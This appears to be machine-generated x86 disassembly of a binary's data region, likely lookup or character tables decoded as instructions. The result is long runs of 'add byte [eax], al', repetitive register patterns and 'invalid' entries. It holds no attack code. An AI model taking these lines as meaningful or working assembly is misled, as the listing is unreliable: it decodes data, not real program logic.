add byte [eax], al
jbe 0x809e2f2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809e2fe
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809e30a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809e316
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809e322
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [ebx], al
and byte [edx], al
and byte [edx], al
and byte [edx], al
and byte [edx], al
and byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [edx], al
add byte [ecx], al
pushal
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
or al, bl
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
or ch, dl
or ch, dl
or ch, dl
or ch, dl
or ch, dl
or ch, dl
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
or ch, al
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
or dh, dl
or dh, dl
or dh, dl
or dh, dl
or dh, dl
or dh, dl
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
or dh, al
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, 0xc0
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add esp, dword [eax]
add byte [eax], al
add ah, byte [eax]
add byte [eax], al
add ah, byte [eax]
add byte [eax], al
add ah, byte [eax]
add byte [eax], al
add ah, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add dword [eax], esp
add byte [eax + eax*8], al
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
or al, bl
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, dl
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
or ch, al
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, dl
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
or dh, al
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, 0xc0
add byte [eax], al
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], 0
add byte [ecx - 0x7e000000], al
add byte [eax], al
add byte [ebx - 0x7c000000], al
add byte [eax], al
add byte [ebp - 0x7a000000], al
add byte [eax], al
add byte [edi - 0x78000000], al
add byte [eax], al
add byte [ecx - 0x76000000], cl
add byte [eax], al
add byte [ebx - 0x74000000], cl
add byte [eax], al
add byte [ebp - 0x72000000], cl
add byte [eax], al
add byte [edi - 0x70000000], cl
add byte [eax], al
add byte [ecx - 0x6e000000], dl
add byte [eax], al
add byte [ebx - 0x6c000000], dl
add byte [eax], al
add byte [ebp - 0x6a000000], dl
add byte [eax], al
add byte [edi - 0x68000000], dl
add byte [eax], al
add byte [ecx - 0x66000000], bl
add byte [eax], al
add byte [ebx - 0x64000000], bl
add byte [eax], al
add byte [ebp - 0x62000000], bl
add byte [eax], al
add byte [edi - 0x60000000], bl
add byte [eax], al
add byte [ecx - 0x5e000000], ah
add byte [eax], al
add byte [ebx - 0x5c000000], ah
add byte [eax], al
add byte [ebp - 0x5a000000], ah
add byte [eax], al
add byte [edi - 0x58000000], ah
add byte [eax], al
add byte [ecx - 0x56000000], ch
add byte [eax], al
add byte [ebx - 0x54000000], ch
add byte [eax], al
add byte [ebp - 0x52000000], ch
add byte [eax], al
add byte [edi - 0x50000000], ch
add byte [eax], al
add byte [ecx - 0x4e000000], dh
add byte [eax], al
add byte [ebx - 0x4c000000], dh
add byte [eax], al
add byte [ebp - 0x4a000000], dh
add byte [eax], al
add byte [edi - 0x48000000], dh
add byte [eax], al
add byte [ecx - 0x46000000], bh
add byte [eax], al
add byte [ebx - 0x44000000], bh
add byte [eax], al
add byte [ebp - 0x42000000], bh
add byte [eax], al
add byte [edi - 0x40000000], bh
add byte [eax], al
add cl, al
add byte [eax], al
add dl, al
add byte [eax], al
add bl, al
add byte [eax], al
add ah, al
add byte [eax], al
add ch, al
add byte [eax], al
add dh, al
add byte [eax], al
add bh, al
add byte [eax], al
add al, cl
add byte [eax], al
add cl, cl
add byte [eax], al
add dl, cl
add byte [eax], al
add bl, cl
add byte [eax], al
add ah, cl
add byte [eax], al
add ch, cl
add byte [eax], al
add dh, cl
add byte [eax], al
add bh, cl
add byte [eax], al
add al, dl
add byte [eax], al
add cl, dl
add byte [eax], al
add dl, dl
add byte [eax], al
add bl, dl
add byte [eax], al
add ah, dl
add byte [eax], al
add ch, dl
add byte [eax], al
add dh, dl
add byte [eax], al
add bh, dl
add byte [eax], al
add al, bl
add byte [eax], al
add cl, bl
add byte [eax], al
add dl, bl
add byte [eax], al
add bl, bl
add byte [eax], al
add ah, bl
add byte [eax], al
add ch, bl
add byte [eax], al
add dh, bl
add byte [eax], al
add bh, bl
add byte [eax], al
add al, ah
add byte [eax], al
add cl, ah
add byte [eax], al
add dl, ah
add byte [eax], al
add bl, ah
add byte [eax], al
add ah, ah
add byte [eax], al
add ch, ah
add byte [eax], al
add dh, ah
add byte [eax], al
add bh, ah
add byte [eax], al
add al, ch
add byte [eax], al
add cl, ch
add byte [eax], al
add dl, ch
add byte [eax], al
add bl, ch
add byte [eax], al
add ah, ch
add byte [eax], al
add ch, ch
add byte [eax], al
add dh, ch
add byte [eax], al
add bh, ch
add byte [eax], al
add al, dh
add byte [eax], al
add cl, dh
add byte [eax], al
add dl, dh
add byte [eax], al
add bl, dh
add byte [eax], al
add ah, dh
add byte [eax], al
add ch, dh
add byte [eax], al
add dh, dh
add byte [eax], al
add bh, dh
add byte [eax], al
add al, bh
add byte [eax], al
add cl, bh
add byte [eax], al
add dl, bh
add byte [eax], al
add bl, bh
add byte [eax], al
add ah, bh
add byte [eax], al
add ch, bh
add byte [eax], al
add dh, bh
add byte [eax], al
add bh, bh
invalid
invalid
inc dword [eax]
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add eax, 0x6000000
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
or eax, 0xe000000
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], dl
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [edx], dl
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], al
adc eax, 0x16000000
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], bl
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [edx], bl
add byte [eax], al
add byte [ebx], bl
add byte [eax], al
add byte [eax + eax], bl
add byte [eax], al
sbb eax, 0x1e000000
add byte [eax], al
add byte [edi], bl
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
and dword [eax], eax
add byte [eax], al
and al, byte [eax]
add byte [eax], al
and eax, dword [eax]
add byte [eax], al
and al, 0
add byte [eax], al
and eax, 0x26000000
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
sub eax, 0x2e000000
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
xor eax, 0x36000000
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
cmp eax, 0x3e000000
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [edx], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax + eax], al
add byte [ebp], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [edi], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
dec edx
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
dec esp
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
dec esi
add byte [eax], al
add byte [edi], cl
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
push edx
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
push esp
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
push esi
add byte [eax], al
add byte [edi], dl
add byte [eax], al
pop eax
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
pop edx
add byte [eax], al
add byte [ebx], bl
add byte [eax], al
pop esp
add byte [eax], al
add byte [ebp], bl
add byte [eax], al
pop esi
add byte [eax], al
add byte [edi], bl
add byte [eax], al
pushal
add byte [eax], al
add byte [ecx], al
add byte [eax], al
inc edx
add byte [eax], al
add byte [ebx], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [ebp], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [edi], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
dec edx
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
dec esp
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
dec esi
add byte [eax], al
add byte [edi], cl
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
push edx
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
push esp
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
push esi
add byte [eax], al
add byte [edi], dl
add byte [eax], al
pop eax
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
pop edx
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
jl 0x809f092
add byte [eax], al
jge 0x809f096
add byte [eax], al
jle 0x809f09a
add byte [eax], al
jg 0x809f09e
add byte [eax], al
add byte [eax], 0
add byte [ecx - 0x7e000000], al
add byte [eax], al
add byte [ebx - 0x7c000000], al
add byte [eax], al
add byte [ebp - 0x7a000000], al
add byte [eax], al
